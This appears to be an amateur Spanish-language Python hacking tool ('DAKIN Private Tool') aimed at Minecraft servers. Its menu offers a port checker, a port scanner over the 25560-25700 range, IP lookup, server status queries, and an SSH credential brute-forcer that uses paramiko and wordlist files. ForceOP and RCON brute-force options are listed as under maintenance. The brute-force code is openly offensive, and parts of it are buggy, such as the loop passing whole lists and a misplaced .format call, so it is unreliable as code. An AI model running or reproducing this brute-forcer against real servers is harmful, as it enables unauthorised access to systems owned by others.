import colorama
from colorama import *
import os
import sys
import socket
from socket import gethostbyname
from random import randint
import sys
import argparse
import time
import paramiko
import time
import concurrent.futures
import threading
import requests
import urllib
from urllib import request


os.system("cls")


print("                                                     ")
print(Fore.RED+" -------------------------------------------------                                                    ")
print(Fore.GREEN+"  _____                 _  __   _____    _   _     ")
print(Fore.MAGENTA+" |  __ \       /\      | |/ /  |_   _|  | \ | |   ")
print(Fore.CYAN+" | |  | |     /  \     | ' /     | |    |  \| |   ")
print(Fore.YELLOW+" | |  | |    / /\ \    |  <      | |    | . ` |   ")
print(Fore.BLUE+" | |__| |   / ____ \   | . \    _| |_   | |\  |   ")
print(Fore.WHITE+" |_____/   /_/    \_\  |_|\_\  |_____|  |_| \_|   ")
print("                                                     ")
print(Fore.RED+" -------------------------------------------------                                                    ")
print("                                                     ")
print("                                                     ")
print("                                                     ")
print("                                                     ")

print("Elige una opcion: ")

print("                                                     ")


print("-" * 60)
print(Style.BRIGHT + Fore.CYAN + "OPCIONES GENERALES")
print("-" * 60)
print(Style.BRIGHT + Fore.BLUE +  "\a1. Foreceop " + Fore.RED +"(Mantenimiento)")
print(Style.BRIGHT + Fore.GREEN + "\a2. Rcon Bruteforce " + Fore.RED +"(Mantenimiento)")
print(Style.BRIGHT + Fore.YELLOW + "\a3. Checker (puerto)")
print(Style.BRIGHT + Fore.CYAN + "\a4. Bruteforce (ftp, ssh, mysql..)")
print(Style.BRIGHT + Fore.MAGENTA + "\a5. Port Scanner")
print(Style.BRIGHT + Fore.RED + "\a6. Obtener la IP de un Servidor")
print("7. Cravatar")



print("                                                     ")

print(Style.BRIGHT + Fore.BLUE + "P" + Fore.GREEN + " R " + Fore.YELLOW + "I " + Fore.CYAN + "V " + Fore.MAGENTA + "A " + Fore.RED + "T " + Fore.BLUE + "E " + Fore.GREEN + "  T " + Fore.YELLOW + "O O " + Fore.CYAN + "L " + Fore.MAGENTA + " 0.2")

print("                                                     ")
print("                                                     ")

opc = int(input(Style.BRIGHT + Fore.RED + "> "))

if opc == 3:

    ip = str(input("Introduce una ip: " + "\n>"))

    puerto = int(input("Introduce un puerto: " + "\n>"))

    sn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result2 = sn.connect_ex((ip, puerto))

    if result2 == 0: #conexion establecida
        str= str(puerto)
        print("conexion establecida!, puedes acceder por: ")
        print(ip + ":" + str )
    else:
        print("No se pudo establecer la conexion")
        sn.close()

if opc == 4:
    os.system("cls")

    opcbrute = int(input(Style.BRIGHT + Fore.RED + "1. SHH \a 2. FTP \a" + Fore.RED + " \n>"))

    if opcbrute == 1:


        def brute(host, puerto, user, password):
            log  = paramiko.util.log_to_file('log.log')
            cliente = paramiko.SSHClient()
            cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                cliente.connect(host, port=puerto, username=user, password=password)

                print("Credenciales de acceso: {}:{} ").format(user, password   )

            except:
                print("Fallo en la autenticacion ")


        ipbrute = str(input(Style.DIM + Fore.RED + "\aIP:"))
        puertobrute = int(input(Style.DIM + Fore.RED + "\aPuerto:"))
        usuario = open('#dakin/user_ssh.txt', 'r')
        usuario = usuario.read().split('\n')
        password = open('#dakin/passsh.txt', 'r')
        password = password.read().split('\n')

        for u in usuario:
            for P in password:
                time.sleep(3)
                brute(ipbrute, puertobrute, usuario, password)

if opc == 5:
    os.system("cls")
    print("                                   ")
    print("-----------------------------------")
    print(Fore.CYAN + "P O R T  S C A N N E R")
    print("-----------------------------------")
    print("                                   ")

    ipscan = str(input("\aIntroduce una IP: "))
    print("\a" + Fore.RED + "> ")
    getIP = gethostbyname(ipscan)



    for portscan in range(25560,25700):
            try:

                scan = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                scan.settimeout(0.3)
                res = scan.connect_ex((ipscan,portscan))

                if res == 0:
                    print (Fore.GREEN +'[Scanner] '+str(portscan) + ' Abierto!!' + '[' + getIP+':'+str(portscan)+']')
                else:
                    #print(portscan)
                    scan.close()
            except Exception as x:
                print (r+'Error!\nMessage:  '+x.message)
    time.sleep(3)

if opc == 6:
    ipip = str(input(Fore.GREEN + "IP: " + Fore.RED + "\n> "))
    print("La IP numerica es: " + gethostbyname(ipip))


if opc == 7:
    mcIP = str(input("IP: " + Fore.RED + "\n> "))

    r = requests.get('https://mcapi.us/server/status?ip=' + mcIP)
    json_data = r.json()

    #variables del json 

    online = json_data["online"]
    motd = json_data["motd"]
    name = json_data["server"]["name"]
    players_mas = json_data["players"]["max"]
    players_now = json_data["players"]["now"]

    print("\n")
    print("-" * 60)
    print(Fore.CYAN + "IP: " +  mcIP)
    print("-" * 60)
    print("")
    print(Fore.GREEN + "-" * 60)

    if online == True:
        print(Fore.GREEN + "ONLINE: TRUE")      

    else:
        print(Fore.RED + "ONLINE: FALSE")    
    print(r)

    print("MOTD: " + motd)
    print("VERSION: " + name)
    print('JUGADORES: ' ,str(players_now),'/',(players_mas))
    print("-" * 60)
    print("\n")